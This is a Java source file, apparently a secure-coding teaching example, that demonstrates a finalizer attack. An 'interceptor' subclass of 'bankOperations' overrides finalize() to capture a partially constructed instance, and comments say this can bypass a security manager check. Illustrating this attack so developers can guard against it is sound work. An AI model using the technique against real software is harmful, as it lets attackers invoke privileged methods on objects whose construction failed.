// The MIT License (MIT)
// 
// Copyright (c) 2016 Robert C. Seacord
// 
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
// 
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
// 
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

package OBJ11J;

// An attacker can exploit this code by extending the bankOperations class 
// and overriding the finalize() method. 

public class interceptor extends bankOperations {
	private static interceptor stealInstance = null;

	public static interceptor get() {
		try {
			new interceptor();
		} catch (Exception ex) {
			/* Ignore exception */}
		try {
			synchronized (interceptor.class) {
				while (stealInstance == null) {
					System.gc();
					interceptor.class.wait(10);
				}
			}
		} catch (InterruptedException ex) {
			return null;
		}
		return stealInstance;
	}

	// attacker's finalizer obtains and stores a reference by using the this
	// keyword.
	public void finalize() {
		synchronized (interceptor.class) {
			stealInstance = this;
			interceptor.class.notify();
		}
		System.out.println("Stole the instance in finalize of " + this);
		// The attacker can now maliciously invoke any instance method
		// on the base class by using the stolen instance reference. This attack
		// can even bypass a check by a security manager.
	}
}